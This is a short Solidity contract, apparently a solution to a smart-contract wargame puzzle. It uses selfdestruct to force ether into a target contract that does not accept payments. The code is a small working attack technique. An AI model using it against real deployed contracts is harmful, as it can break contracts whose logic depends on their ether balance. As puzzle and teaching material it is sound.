pragma solidity ^0.8.13;

contract ForceSolver {

    function solve(address payable target) public payable {
        selfdestruct(target);
    }
    receive() external payable {
        // React to receiving ether
    }}